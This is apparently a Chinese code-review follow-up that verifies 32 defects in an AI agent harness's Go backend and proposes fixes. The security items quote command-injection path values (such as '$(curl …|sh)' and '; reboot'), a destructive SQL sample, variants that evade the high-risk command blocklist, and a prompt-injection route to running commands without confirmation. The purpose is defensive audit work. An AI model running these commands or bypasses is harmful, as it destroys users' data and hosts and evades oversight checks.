# Agent Harness 审查问题复核与修复建议

> 基准文档：[`docs/agent-harness-review.md`](./agent-harness-review.md)（2026-08-21 审查报告，#1–#32）
> 复核方式：逐条对照当前仓库源码读码验证（Go 后端 + 前端事件消费代码），未修改任何源代码。
> 复核日期：2026-08-21
> 结论分布：**确认存在 30 条，部分存在 1 条（#14），误报 0 条，需进一步确认 1 条（#9 前端细节，后端部分已确认）**。

## 复核结论速览

| # | 问题 | 复核结论 | 优先级 |
|---|------|---------|--------|
| 1 | 后台作业/子代理绑定单次工具调用 ctx | 确认存在 | P0 |
| 2 | SSH 工具路径拼接命令注入 | 确认存在 | P0 |
| 3 | SQLite "只读" 工具无校验 | 确认存在 | P0 |
| 4 | 子代理工具循环死代码 | 确认存在 | P0 |
| 5 | workflow 动作空壳成功 | 确认存在 | P0 |
| 6 | 递归深度防护失效 | 确认存在 | P0 |
| 7 | 设置开关未接线 | 确认存在 | P0 |
| 8 | 会话无单飞控制 | 确认存在 | P1 |
| 9 | session_id 信任模型自报 / 伪造子代理会话 | 确认存在（前端细节见备注） | P1 |
| 10 | shell 取消路径 send-on-closed-channel | 确认存在 | P1 |
| 11 | LocalExecutor 顺序读管道 / Unix 孤儿进程 | 确认存在 | P1 |
| 12 | GetStore 错误不持久化 | 确认存在 | P1 |
| 13 | ExecuteDAG 取消误报成功 / Fatal 不消费 | 确认存在 | P1 |
| 14 | planner 降级伪成功 | **部分存在** | P1 |
| 15 | 单步重试丢上下文/不可取消/数据竞争 | 确认存在 | P1 |
| 16 | 退出零清理 + 四处无界增长 | 确认存在 | P1 |
| 17 | Plan/Job 状态仅存内存 | 确认存在 | P2 |
| 18 | 上下文压缩不闭环 | 确认存在 | P2 |
| 19 | 状态机/WorkingMemory/Subscribe 半成品 | 确认存在 | P2 |
| 20 | AgentManager data race | 确认存在 | P1 |
| 21 | LLM 调用无超时 | 确认存在 | P1 |
| 22 | BuildDAG 改名不回写 | 确认存在 | P2 |
| 23 | 高危黑名单子串匹配可绕过 | 确认存在 | P1 |
| 24 | 其余正确性/契约缺陷（8 个子项） | 确认存在 | P1 |
| 25 | 迭代上限/预算不可配置 | 确认存在 | P2 |
| 26 | 工具结果无统一截断 | 确认存在 | P2 |
| 27 | http_request_readonly 无 SSRF 防护 | 确认存在 | P1 |
| 28 | 记忆检索为 SQL LIKE | 确认存在 | P2 |
| 29 | 事件系统三轨并行/命名混乱/死分支 | 确认存在 | P2 |
| 30 | 会话级 workspace 未兑现 | 确认存在 | P2 |
| 31 | 每次发送全量重建 Runner | 确认存在 | P2 |
| 32 | 其余建议（7 个子项） | 确认存在 | P2 |

---

## Critical Issues（P0）

### #1 后台作业/子代理绑定单次工具调用 ctx，返回即被杀

- **问题摘要**：`run_in_background` / `job_submit` / `subagent_spawn` 提交的后台任务生命周期绑定在单次工具调用的 ctx 上，工具返回即取消。
- **校验结论**：✅ 确认存在。完整因果链已闭环验证：
  - `agent/tools/bus.go` L210-215：`toolCtx, cancel := context.WithTimeout(ctx, timeout); defer cancel()`——每次 `ToolBus.Invoke` 都创建调用级 ctx 并在返回时 cancel；
  - `agent/tools/shell.go` L37：handler 将该 ctx 直接传入 `jm.SubmitExec(ctx, ...)`；
  - `agent/job/job.go` L129：`jobCtx, cancel := context.WithCancel(ctx)` 再派生给后台进程；
  - `agent/subagent/subagent.go` L85、`agent/tools/orchestration.go` L187：`Spawn(ctx, ...)` 同样透传。
- **触发条件/调用链**：主循环 → `ToolBus.Invoke`（toolCtx + defer cancel）→ `SubmitExec/Spawn` → 工具返回 → cancel 触发 → `exec.CommandContext` 杀进程 / 子代理 `Generate` 收到 `context canceled`。后台作业毫秒级变 killed。
- **影响范围**：三条后台路径整体失效；系统提示词与工具返回值对用户/模型的"持续运行"承诺全部落空。
- **修复目标**：后台任务绑定 app/session 级生命周期，Kill/Interrupt 走显式注册表。
- **推荐修复**：
  ```go
  // tools/shell.go、tools/orchestration.go handler 内（go 1.27 可用 WithoutCancel）：
  bgCtx := context.WithoutCancel(ctx)
  jobID, err := jm.SubmitExec(bgCtx, sessionID, "shell_cmd", spec, ...)
  ```
  更优：`JobManager`/`SubagentManager` 构造时接收 app 级 ctx（`DefaultRuntime.SetContext` 已持有），内部统一派生；配合 #16 的 `KillAll` 在退出时清理。
- **风险说明**：`WithoutCancel` 同时丢弃 value；若 handler 依赖 ctx value（如 `SessionIDFromContext`），需在包装前提取并以参数显式传递。
- **验证方式**：提交一个 `sleep 5` 后台作业，工具返回后等待 6s，确认作业状态为 completed 且有完整输出；子代理 spawn 后确认能正常 finished。
- **优先级**：**P0**

### #2 SSH 工具路径直接拼进 shell 命令——远程命令注入

- **问题摘要**：`ssh_read_file` / `ssh_download_file` 将未转义的路径拼入 `cat %s` / `base64` 命令串。
- **校验结论**：✅ 确认存在。
  - `agent/tools/ssh.go` L208、L278：`fmt.Sprintf("cat %s", ssh.NormalizeRemote(input.Path))`，guard 级别 `LevelAllow`（免确认）；
  - L235、L321：`echo %s | base64 -d > %s` 虽为 `LevelConfirm`，但路径仍可注入；
  - `ssh/sftp.go` L225-239 `NormalizeRemote`：仅斜杠规范化 + `path.Clean`，不转义 `;` `&` `|` `$` 反引号等元字符。
- **触发条件**：模型调用 `ssh_read_file(path="/tmp/x; reboot")` 或 `/tmp/$(curl …|sh)`；被污染的远程文档经提示注入可**无确认**触发。
- **影响范围**：远程主机任意命令执行；Allow 级使其成为提示注入的直接跳板。
- **修复目标**：文件读写不经过远端 shell 解析。
- **推荐修复**：优先改用 SFTP（`SessionManager` 已有 `sftpConn` 基础设施，`ListDir` 即范本）；若必须走 shell：
  ```go
  func safeRemotePath(p string) (string, error) {
      if strings.ContainsAny(p, ";|&$`\n\r\"'\\<>()*?") { return "", fmt.Errorf("非法路径字符") }
      return "'" + p + "'", nil // 单引号包裹
  }
  ```
- **风险说明**：SFTP 读取大文件的内存占用需配合 #26 截断策略。
- **验证方式**：单测覆盖 `path="/tmp/x; touch /tmp/pwned"` 等注入样本，断言被拒绝或字面化处理；真机验证读文件行为不变。
- **优先级**：**P0**

### #3 db_sqlite_query_readonly 名为只读、实为任意写

- **问题摘要**：SQLite 查询工具无 SQL 白名单校验，guard 级别为 Allow。
- **校验结论**：✅ 确认存在。
  - `agent/tools/db.go` L517-528：handler 直接 `SqliteRun(input.SQL)`，无任何语句类型校验（MySQL 同文件有 `isStrictlyReadonlySQL` 对照）；
  - `agent/guard/guard.go` L162：`db_sqlite_query_readonly` 登记为 `LevelAllow` 且无 AuditFunc。
- **触发条件**：模型（或被注入的上下文）提交 `DROP TABLE users`，免确认直接执行。
- **影响范围**：用户 SQLite 数据库可被无确认破坏；与"move_file 都要 Confirm"的权限模型矛盾。
- **修复目标**：只读工具只放行只读语句。
- **推荐修复**：handler 内复用/移植 `isStrictlyReadonlySQL`（白名单 SELECT/PRAGMA 只读项，拒绝 `PRAGMA journal_mode` 等可写 PRAGMA）；校验失败返回 error。同时将 guard 级别提升为 `LevelConfirm` 作为双保险；顺带对 `db_mongo_aggregate` 过滤 `$out`/`$merge` 阶段。
- **风险说明**：部分合法 PRAGMA（如 `table_info`）需显式列入白名单，避免误伤。
- **验证方式**：单测断言 `DELETE/DROP/INSERT/UPDATE/ATTACH` 被拒，`SELECT/PRAGMA table_info` 放行。
- **优先级**：**P0**

### #4 子代理"自主工具调用循环"是死代码

- **问题摘要**：子代理 runner 的 `Generate` 未携带工具定义，模型永不产生 tool_calls。
- **校验结论**：✅ 确认存在。
  - `agent/runtime.go` L137：`out, err := res.Model.Generate(ctx, schemaMsgs)`，无 `model.WithTools(...)`；
  - 全仓 Grep `WithTools|model\.With` 零匹配——工具执行分支（L140 之后）永远不会进入，首轮即 return。
- **触发条件**：任何 `subagent_spawn` 调用；子代理实际退化为单轮纯文本问答。
- **影响范围**：核心 harness 能力（隔离上下文 + 工具增强并发子代理）未交付，且系统提示词宣称的能力与事实不符。
- **修复目标**：子代理真实具备多轮工具调用能力。
- **推荐修复**：
  ```go
  tools := toolBus.ConvertToEinoTools(subID) // 需剔除递归工具，见 #6
  out, err := res.Model.Generate(ctx, schemaMsgs, model.WithTools(tools))
  // 循环处理 out.ToolCalls：InvokableRun → 追加 tool 消息 → 再次 Generate，直到无 ToolCalls 或达到轮数上限
  ```
  或直接复用 `session.go` 主循环的 `adk.NewChatModelAgent + adk.Runner` 方案，减少两套实现漂移。
- **风险说明**：工具循环需配合 #6（剔除 `subagent_spawn`）、#26（输出截断）、迭代上限，否则引入新的失控面。
- **验证方式**：构造"子代理需调用 read_file 才能回答"的任务，断言事件流中出现子代理的 ToolStart/ToolEvent 且最终答案引用了文件内容。
- **优先级**：**P0**

### #5 Executor 的 workflow 动作是空壳成功

- **问题摘要**：计划中的 workflow 步骤调用 `Pipeline` 时 stages 传 nil，零执行却报 OK。
- **校验结论**：✅ 确认存在。
  - `agent/executor/executor.go` L412：`e.workflowEng.Pipeline(ctx, plan.SessionID, wfSpec.Items, nil, nil)`；
  - `agent/workflow/workflow.go` L41-76：`for j, stage := range stages`（nil → 零迭代），items 原样 append，stepRes `OK:true`；
  - 真正有执行能力的 `RunWorkflow`（workflow.go L115）已被 `orchestration.go` 的 `workflow_run` 工具接入，唯独 executor 的 workflow 动作未接入。
- **触发条件**：planner 产出含 workflow 动作的计划（DB 中已有 workflows 表数据时）。
- **影响范围**：用户看到"workflow 执行成功"但实际零执行——失败语义失真的典型样本。
- **修复目标**：workflow 动作真实执行或显式报不支持。
- **推荐修复**：
  ```go
  // executor.go workflow 分支：
  invoker := func(ctx context.Context, toolName, argsJSON string) (string, error) {
      return e.toolBus.Invoke(ctx, traceID, plan.SessionID, toolName, argsJSON)
  }
  res := e.workflowEng.RunWorkflow(ctx, plan.SessionID, wfSpec.WorkflowName, invoker)
  ```
  参照 `orchestration.go` `workflow_run` 的既有实现。
- **风险说明**：RunWorkflow 内部若同样依赖工具 ctx，需叠加 #1 的修复。
- **验证方式**：注册一个两阶段 workflow（如 echo 两步），执行计划后断言两个阶段均有输出；stages 为空时断言返回明确错误而非 OK。
- **优先级**：**P0**

### #6 子代理递归深度防护失效

- **问题摘要**：所有 Spawn 调用点硬编码 depth=1，`depth > maxDepth` 判断永假。
- **校验结论**：✅ 确认存在。
  - `agent/subagent/subagent.go` L73：`if depth > sm.maxDepth`（maxDepth=3）；
  - `agent/tools/orchestration.go` L187：`Spawn(ctx, "", input.SessionID, input.Prompt, input.ExpectedSchema, 1)` 硬编码 1；
  - `agent/executor/executor.go` 的 spawn 分支同样传 1；
  - 子代理 runner 使用全量工具列表（含 `subagent_spawn`），可无限串行递归。
- **触发条件**：子代理被指示"再派生子代理"，形成失控 LLM 调用链（费用与延迟爆炸）。
- **影响范围**：递归失控防护完全无效。
- **修复目标**：真实深度追踪或硬性禁止二次委派。
- **推荐修复**（二选一，推荐后者，实现成本最低）：
  1. `Subagent` 结构记录 `ParentID`/`Depth`，spawn 时按父记录 +1；
  2. 子代理工具集构建时剔除 `subagent_spawn`/`subagent_send`（与 #4 修复同步进行：`ConvertToEinoTools` 增加 exclude 参数）。
- **风险说明**：方案 2 限制了合法的多层编排；如有需求可保留 1 层。
- **验证方式**：子代理提示词要求其 spawn，断言收到"不允许二次委派"错误；或断言 depth=3 时 Spawn 被拒绝。
- **优先级**：**P0**

### #7 三个安全/功能设置开关定义但从未接线

- **问题摘要**：`AiEnableWebSearch / AiEnablePermissionGuard / AiBlockHighRiskCommands` 可配置但零消费。
- **校验结论**：✅ 确认存在。
  - `core/settings.go` L19-21 定义三开关，前端设置页可持久化；
  - `agent/runtime.go` L71：`guard.NewPolicyGuard(true, true, st)` 硬编码两个 true；
  - `web_search` 无条件注册；`agent/guard/guard.go` 无 `SetEnabled`/`SetBlockHighRiskCommands` setter；全仓 Grep 三个字段零消费点。
- **触发条件**：用户在设置页关闭任一开关——行为无任何变化。
- **影响范围**：配置契约静默失效；用户对安全边界的控制感是虚假的。
- **修复目标**：设置真实驱动 Guard 与工具注册。
- **推荐修复**：
  ```go
  // guard.go
  func (g *PolicyGuard) SetEnabled(b bool)                { g.enabled = b }
  func (g *PolicyGuard) SetBlockHighRiskCommands(b bool)  { g.blockHighRisk = b }
  // runtime.go InitOrUpdate：
  g.SetEnabled(cfg.AiEnablePermissionGuard)
  g.SetBlockHighRiskCommands(cfg.AiBlockHighRiskCommands)
  // web_search 按 cfg.AiEnableWebSearch 决定是否注册（或在 Evaluate 中动态拒绝）
  ```
  注意 `InitOrUpdate` 在配置变更时会重建，需保证开关在每次重建时重新应用。
- **风险说明**：关闭 Guard 属于用户自陷风险，建议 UI 侧加醒目警示；`enabled=false` 时高危黑名单是否仍生效需产品决策（建议黑名单与 Guard 开关解耦）。
- **验证方式**：分别关闭三开关，验证：不再弹审批（或按决策仍拦高危）、`web_search` 从工具列表消失、黑名单命令放行/拦截符合预期。
- **优先级**：**P0**

---

## Warnings（P1 为主）

### #8 同一会话无单飞控制——并发流互相覆盖

- **校验结论**：✅ 确认存在。
  - `agent/agent.go` L378-379：`cancelMap` 以 sessionID 为键 Store/Delete，第二次并发 `StreamChat` 覆盖第一次的 cancelFunc，`StopChat` 只能停最后一次；
  - `AgentSend` 无 per-session 互斥；`services/agent_service.go` L178-270 中 `AgentApprovePlan` 后台执行期间用户仍可发消息，两条流都写"最后一条 assistant 消息"，Plan 的 Done 报告可整体覆盖流式聊天内容。
- **影响范围**：输出交错、消息覆盖、停止按钮失效。
- **修复目标**：会话级单飞 + 回合隔离。
- **推荐修复**：`StreamChat` 入口检查会话忙状态（`sess.mu.TryLock()` 失败则拒绝并提示）；事件 payload 增加 `turn_id`，前端按回合定位消息而非"最后一条 assistant"。
- **风险说明**：拒绝并发后需保证前端生成态正确复位。
- **验证方式**：并发双发 + 单测/手测 `-race`；断言第二次发送收到"会话忙"提示。
- **优先级**：**P1**

### #9 编排工具信任模型自报 session_id；子代理事件挂伪造会话

- **校验结论**：✅ 确认存在（后端部分）；前端过滤器细节需备注。
  - 后端：`agent/tools/orchestration.go` L118/L187 直接使用 `input.SessionID` 无回退（对比 ask_user 有 `SessionIDFromContext`）；`agent/runtime.go` L151 子代理工具调用会话写死 `"subagent_"+subID`。
  - 前端（本次补验）：`frontend/src/pages/agent/hooks/useAgentEvents.ts` L113-119 过滤条件为 `!event.session_id || === activeSessionId || === 'ai_agent_default' || activeSessionId === 'ai_agent_default'`——**并非字面恒真**，但当激活的是默认会话（最常见场景）或事件缺 session_id 时全放行；且 L119 对 AskUser 类型完全豁免过滤。原报告"恒真"表述略有夸大，但跨流污染在默认会话下确实发生。
- **触发条件**：模型漏填 session_id → 作业在工作台不可见；子代理事件在默认会话下混入主聊天。
- **修复目标**：会话身份以 ctx 为权威，子代理事件按父会话路由。
- **推荐修复**：编排工具 handler 一律 `sid := SessionIDFromContext(ctx); if sid == "" { sid = input.SessionID }`；子代理 runner 透传父会话 ID（保留 subID 作为 `source` 字段供前端区分子代理来源）。
- **风险说明**：前端过滤器收紧后需确保所有合法事件携带 session_id，否则事件丢失。
- **验证方式**：非默认会话下 spawn 子代理，断言其工具步骤出现在对应会话卡片而非当前聊天末尾。
- **优先级**：**P1**

### #10 流式 shell 取消路径 send-on-closed-channel panic

- **校验结论**：✅ 确认存在。
  - `agent/shell/shell.go` L255-261：前台模式 `case <-ctx.Done(): killProcessTree(cmd); sw.Send(nil, ctx.Err()); return` → 触发 defer `sw.Close()`（L201-205）；两个 `readPipe` goroutine（L228-236）通过 ctx 检查后仍可能 `sw.Send` → 向已关闭 channel 发送 → panic，且全链路无 recover，击穿整个桌面进程。
- **触发条件**：命令执行中取消（用户停止/超时），恰与管道读取竞态。
- **修复目标**：Close 与 Send 建立 happens-before。
- **推荐修复**：`sw.Close()` 移到 `wg.Wait()` 之后统一执行；`ctx.Done` 分支只做 `killProcessTree + sw.Send(nil, ctx.Err())`，不提前 return（参照同文件既有结构小改即可）。
- **风险说明**：需确认 kill 后管道读取能及时 EOF，避免 wg.Wait 悬挂（kill 进程树后管道会关闭，可行）。
- **验证方式**：压测：启动 `ping`/长输出命令并循环取消 100 次，进程不崩溃；`go test -race ./agent/shell/`。
- **优先级**：**P1**

### #11 LocalExecutor 顺序读管道 + Unix 无进程组隔离

- **校验结论**：✅ 确认存在。
  - `agent/job/executor.go` L98：`io.MultiReader(stdout, stderr)` 先读尽 stdout 才读 stderr——stderr 超 64KB 管道缓冲且进程未退出时作业假死至超时被误杀；
  - L120-122：仅 Windows 分支有 killProcessTree，Unix 无 `Setpgid`，取消后 `bash -c` 派生的 npm/node 等子孙进程成为孤儿。同仓库 `agent/shell/shell.go` L210-246 与 `proc_unix.go` 已有正确范本。
- **修复目标**：并发读管道 + 平台一致的进程树清理。
- **推荐修复**：直接复用 `agent/shell` 的双 goroutine 读管道 + `wg.Wait()` 后 `cmd.Wait()` 结构；Unix 补 `SysProcAttr{Setpgid: true}` + 取消时 `syscall.Kill(-pid, SIGKILL)`。
- **风险说明**：Setpgid 在容器/受限环境下的兼容性需测试。
- **验证方式**：构造 stderr 输出 >128KB 的作业断言正常完成；Unix 上取消 `sleep` 管道命令后断言无孤儿（`pgrep`）。
- **优先级**：**P1**

### #12 GetStore 失败后错误不持久化，持久层静默失效

- **校验结论**：✅ 确认存在。
  - `agent/store/store.go` L112-122：`err` 是函数局部变量，首次失败后 `sync.Once` 不再执行，二次调用返回 `(nil, nil)`；
  - `agent/runtime.go` L69：`st, _ := store.GetStore()` 直接丢弃错误。
- **触发条件**：首次打开 DB 失败（目录只读/文件被占用）→ 之后历史消息、作业、审计日志、记忆、工作流全部不落盘且无任何告警。
- **修复目标**：错误可见、可诊断。
- **推荐修复**：
  ```go
  var storeInitErr error // 包级 sticky error
  func GetStore() (*Store, error) {
      storeOnce.Do(func() { defaultStore, storeInitErr = NewStore(...) })
      return defaultStore, storeInitErr
  }
  ```
  并在 `services/container.go` 启动时显式调用一次，失败向 UI 弹错；runtime.go 检查错误并降级提示。
- **风险说明**：无显著风险；sticky error 意味着运行期无法自愈（可接受，磁盘类故障通常持续）。
- **验证方式**：单测：令 NewStore 首次失败，断言二次 GetStore 返回同一 error 而非 (nil, nil)。
- **优先级**：**P1**

### #13 ExecuteDAG 取消误报成功 + Fatal 字段不消费

- **校验结论**：✅ 确认存在。
  - `agent/executor/executor.go` L177-180 层间 `ctx.Err()` break 后 L256 `return allResults, nil`；
  - `services/agent_service.go` L188-196：err==nil 即报告"✅ 全部规划步骤执行完成"——被 `AgentCancelPlan` 停止的计划被报告为成功（前端 useAgentEvents.ts L403-406 靠文案嗅探兜底"执行过程中断"，说明问题已被察觉但未根治）；
  - `agent/executor/retry.go` L86/L95 专门设置 `finalRes.Fatal = true`，但 ExecuteDAG L237-248 对任何 `!r.OK` 都视为 fatalErr，从不检查 Fatal 字段。
- **修复目标**：取消=取消，fail-fast 语义与字段一致。
- **推荐修复**：break 后 `return allResults, ctx.Err()`；service 层区分 `context.Canceled` 输出"规划已被停止"；DAG 中止条件改为 `if r.Fatal`（普通失败可继续后续无依赖层，按产品决策）。
- **风险说明**：返回 ctx.Err() 后上层所有 err 判断路径需回归（含重试、报告生成）。
- **验证方式**：执行多步计划中途 cancel，断言报告文案为"已停止"且 DB 步骤状态为 stopped。
- **优先级**：**P1**

### #14 planner 降级路径"伪成功"计划 —— **部分存在**

- **校验结论**：⚠️ 部分存在（较原报告有缓解，但未根治）。
  - 仍存在：`agent/planner/planner.go` 三处 fallback（L71-90 无 planner 模型、L126-148 Generate 失败、L201-221 JSON 解析失败）仍返回 `Action:"tool_call"`、ToolName/Args 为空的单步计划；service 层仍未拦截"无可用 planner 模型"。
  - 已缓解：`agent/executor/executor.go` L300-308 现已存在空 ToolName 检查——`tool_call` 且 ToolName 为空时返回 `OK:false, Error:"未指定需要调用的工具名称"`，原报告所述的"tool_call 空步骤伪成功"路径已被拦截。
  - 残留：executor L456-473 default 分支（未知 action 且无 ToolName）仍 `OK:true, Output: step.Description` 伪成功。
- **影响范围**：降级场景下用户仍可能看到与实际不符的"成功"。
- **修复目标**：降级可感知、零执行不报成功。
- **推荐修复**：fallback 计划显式 `Status:"skipped"` 并附原因；default 分支对无 ToolName 步骤返回失败/跳过；`AgentSend`/plan 入口检测无 planner 模型时直接提示用户配置。
- **风险说明**：低。
- **验证方式**：清空 planner 模型配置后触发规划，断言 UI 收到明确"未配置规划模型"提示而非成功报告。
- **优先级**：**P1**

### #15 计划失败恢复不闭环：单步重试丢上下文/不可取消/数据竞争

- **校验结论**：✅ 确认存在。
  - `services/agent_service.go` L285-315 `AgentRetryPlanStep`：(a) `stepOutputs` 传空 map，`{{step_x.output}}` 模板渲染失效且不级联；(b) 使用 `context.Background()` 且未注册进 `planCancelMap`——`AgentCancelPlan` 停不掉，Wails 调用同步阻塞分钟级；(c) 直接写 `targetStep.Status`，与后台 Executor 的写构成数据竞争。
  - `agent/planner/plangate.go` `ExemptStep/IsStepExempted` 全仓无调用方（Grep 验证）。
- **修复目标**：重试 = 受控的受取消、带上下文的再执行。
- **推荐修复**：重试前从已完成步骤的 Output 重建 stepOutputs；`context.WithCancel` 注册进 planCancelMap 并异步执行（立即返回，结果走事件）；plan 状态更新收敛到单一加锁写路径；豁免机制删除或真正接入。
- **风险说明**：异步化后前端需适配重试结果事件。
- **验证方式**：重试依赖上游输出的步骤，断言模板渲染成功；重试期间 cancel，断言可停止。
- **优先级**：**P1**

### #16 应用退出零清理 + jobs/subagents/PlanGate 无界增长

- **校验结论**：✅ 确认存在。
  - `services/container.go` L70-78 Shutdown 只关连接管理器；`JobManager` 无 KillAll（Grep 确认该方法不存在），运行中本地作业成为孤儿；
  - `agent/job/job.go` L142-144 `jm.jobs[jobID] = j` 只增不删（含大 Result 字符串）；subagents map 同；
  - `agent/planner/plangate.go` `activePlans`/`exemptions` 永不清理且持有完整 Plan，无 `Complete` 方法；
  - `agent/store/store.go` L383-391 `DeleteSession` 只删 messages/audit_logs/sessions，不级联 jobs/job_output/subagents；`Store.Close()` 无调用方。
- **修复目标**：退出收敛 + 终态回收 + 删除级联。
- **推荐修复**：新增 `AgentRuntime.Shutdown()`（KillAll 作业、取消活跃子代理/计划、`Store.Close()`）挂入 container.Shutdown；作业/子代理终态后延迟（如 10min）剔除；PlanGate 增加 `Complete(planID)` 在计划结束时调用；DeleteSession 级联。
- **风险说明**：KillAll 需与 #1 配套（app 级 ctx 才有统一的取消入口）。
- **验证方式**：启动长作业后退出应用，断言进程树被清理；长跑会话压测观察内存/DB 行数稳定。
- **优先级**：**P1**

### #17 Plan/Job 状态仅存内存——重启后悬挂，resume 缺失

- **校验结论**：✅ 确认存在。`agent/planner/plangate.go` 纯内存；重启后前端 plan 卡片 `executing:true` 永久悬挂（前端 useAgentEvents.ts L415 亦依赖该字段），cancel/retry 返回"规划不存在"，DB job 停在 running。
- **修复目标**：中断后可收敛（最小版），可选可恢复。
- **推荐修复**：最小方案：Plan 步骤状态变更写回 store；应用启动时把 running 态 job/plan 统一收敛为 stopped/failed 并刷新前端。完整 resume（重新调度未完成步骤）可分期。
- **风险说明**：状态双写（内存+DB）需明确单一事实源，建议 DB 为准、内存缓存。
- **验证方式**：执行计划中途强杀应用，重启后断言 plan 卡片不再悬挂、job 状态为 failed/stopped。
- **优先级**：**P2**（与 #16 同批实施更经济）

### #18 上下文压缩不闭环：估算失真 + 摘要不持久

- **校验结论**：✅ 确认存在。`agent/agent.go` L290 `estTokens := totalChars / 3`（CJK 实际约 1:1，低估约 3 倍，实际超限才触发）；L319-326 摘要结果不落盘、不回写 messages，下一轮对同段历史重复摘要。
- **修复目标**：一次摘要、持久替换、增量维护。
- **推荐修复**：CJK 字符按 1:1 计 token；摘要以 `kind=summary` 消息替换被压缩段并回写 store；后续轮次从 summary 消息起算。
- **风险说明**：回写改变了历史消息列表形态，前端渲染与导出需兼容 summary 类型。
- **验证方式**：构造超长会话触发两次压缩，断言第二次不再对已摘要段重复调用 LLM。
- **优先级**：**P2**

### #19 状态机 / WorkingMemory / EventBus 订阅为半成品

- **校验结论**：✅ 确认存在（Grep 逐项验证）。
  - `agent/session.go`：8 个 SessionState 仅 L60 idle、L168 stopped 两处赋值；L65 `workingMem` 创建后全链路无读写；
  - `agent/events/events.go`：L143 `rawEvents` 死字段；L177-179 `go h(e)` 无 recover 无顺序保证；`Subscribe` 无订阅方；`EventGoalUpdated` 无 emit 方；
  - `agent/memory/memory.go` `CompressSlidingWindow` 无调用方。
- **修复目标**：接线或删除，消除误导性 API。
- **推荐修复**：短期：`StreamChat`/`AgentApprovePlan` 前后置广播 `executing/done/failed`（前端可借此驱动 UI 状态）；`go h(e)` 加 recover。长期：working memory 每轮维护或删除；死 API 删除。
- **风险说明**：删除导出符号属于破坏性变更，需确认 bindings 未引用（前端 bindings 未见引用）。
- **验证方式**：事件流断言生命周期事件按序出现；`-race` 通过。
- **优先级**：**P2**

### #20 AgentManager 多字段无锁读写（data race）

- **校验结论**：✅ 确认存在。`agent/agent.go` `SetSSHManager` 持写锁写 `sshMgr`/`cfg`，但 `buildSchemaMessages`（L197/L237）不持锁读；`SetContext`（L137-140）完全无锁写 `m.ctx` 与持锁读它的 `InitOrUpdate` 竞争。`SetSSHManager` 每次 `AgentSend` 都调用，竞态窗口真实存在。
- **修复目标**：`go test -race` 干净。
- **推荐修复**：`buildSchemaMessages`/`SetContext` 统一在 `m.mu` 保护下访问，或调用方先取快照。
- **风险说明**：持锁调用 LLM 相关构造逻辑时注意锁粒度，避免长持锁。
- **验证方式**：并发 AgentSend + SetContext 压测，`-race` 零报告。
- **优先级**：**P1**

### #21 LLM 调用全程无超时

- **校验结论**：✅ 确认存在。`agent/router/router.go` L83-88 `ChatModelConfig` 从不设置 Timeout（eino-ext openai 默认无超时）；`StreamChat` chatCtx 派生自 `context.Background()` 无 deadline；压缩摘要 `Generate`（agent.go L319）同样裸奔。
- **修复目标**：端点挂起时请求可收敛。
- **推荐修复**：`router.Resolve` 构造 cfg 时设 `Timeout: 180 * time.Second`（可按模型分档）；流式场景在 `StreamChat` 层包 `context.WithTimeout` 并区分首 token 超时。
- **风险说明**：长推理模型（reasoning）可能被 180s 误杀——建议流式用"空闲超时"（N 秒无 chunk 即取消）而非总时长。
- **验证方式**：指向不响应的 mock 端点，断言在超时后返回明确错误而非永久悬挂。
- **优先级**：**P1**

### #22 BuildDAG 重复步骤 ID 改名不回写

- **校验结论**：✅ 确认存在。`agent/executor/dag.go` L26-29：重命名只写入 `stepMap` 的副本（循环变量 `st` 拷贝），原 `steps` 切片不变；executor.go L212-224 用原 ID 匹配回写结果永远失败——步骤执行并消耗配额，结果被静默丢弃。
- **修复目标**：重复 ID 要么显式报错，要么改名可回写。
- **推荐修复**：`BuildDAG` 接收 `*planner.Plan` 原地改名；或直接返回错误让 planner 重试（更简单、更符合契约）。
- **风险说明**：报错路径需 planner 侧能消化该类错误（归入 #14 的失败语义统一）。
- **验证方式**：构造含重复 ID 的计划，断言要么 planner 重规划，要么步骤结果正确回写到对应步骤。
- **优先级**：**P2**

### #23 高危命令黑名单为朴素子串匹配，不覆盖 Windows/PowerShell

- **校验结论**：✅ 确认存在。`agent/guard/guard.go` L14-25 仅 10 个 `strings.Contains` 模式；`rm -fr /`（调换标志）、带引号变体、`Remove-Item -Recurse`、`Format-Volume`、base64 解码管道均绕过；本项目主环境恰为 Windows/PowerShell。叠加会话 Remember 授权（30 分钟自动放行）后，绕过变体完全不经过确认。
- **修复目标**：黑名单与平台语义匹配，Remember 不豁免高危。
- **推荐修复**：按 shell（cmd/powershell/bash）维护模式集，匹配前规范化（去引号、压缩空白、展开常见混淆）；Remember 授权期间高危模式仍独立拦截；长期在 shell 层参数化执行。
- **风险说明**：规范化过度会误拦合法命令——模式集应以破坏性动词为核心，配合白名单常见安全用法。
- **验证方式**：绕过样本库（调换标志/引号/PowerShell 变体）回归测试全部命中；Remember 后高危仍弹确认。
- **优先级**：**P1**

### #24 其余正确性/契约缺陷（合并条目，8 个子项全部确认）

| 子项 | 证据 | 结论 |
|------|------|------|
| ask_user 超时返回"成功+空答案" | `agent/ask/ask.go` L74-75 超时返回 `("", nil)`；`agent/executor/executor.go` L439-446 `OK: err == nil` | 确认 |
| Temperature=0 被强制改为 0.7 | `agent/router/router.go` L74-77 `if temp <= 0 { temp = 0.7 }` | 确认 |
| Executor fallback 调用不存在工具名 `exec_command` | `agent/executor/executor.go` L357；注册名为 `execute` | 确认 |
| expected_schema 假校验 | `agent/subagent/subagent.go` L154-164 仅 `json.Unmarshal` 判合法性，`{}` 也通过 | 确认 |
| skill 工具未注册但 guard 有规则 + 路径穿越隐患 | `agent/guard/guard.go` L184-185 死规则；`orchestration.go` 仅存未使用的 `SkillLoadInput`；`agent/skills/skills.go` L167 `filepath.Join(dir, name, "SKILL.md")` 无清洗 | 确认 |
| verifier 只覆盖 plan 路径 | `agent/verifier/verifier.go` 仅被 executor 调用，主对话循环工具结果零验证 | 确认 |
| 主循环工具调用 traceID 恒空 | `agent/tools/bus.go` L313-314 `w.bus.Invoke(ctx, "", ...)` | 确认 |
| 会话 Settings 为创建时快照 | `agent/runtime.go` L257-284；默认会话存活整个应用生命周期 | 确认 |

- **修复目标与方案**（逐子项）：
  1. ask_user 超时返回明确 error（如 `ErrAskTimeout`），executor 分支将超时标记为失败/可重试；
  2. Temperature 用 `*float32` 区分未设置与显式 0；
  3. `"exec_command"` 改为 `"execute"`（一行修复）；
  4. 引入 JSON Schema 校验（如 `santhosh-tekki/jsonschema`）或改名 `expect_json` 并文档化弱语义；
  5. 补注册 `skill_load/skill_list`（name 做 `filepath.Base` 清洗）或删除死规则/死表；
  6. 在 `guardWrappedEinoTool.InvokableRun` 出口挂接可选规则级 Verify；
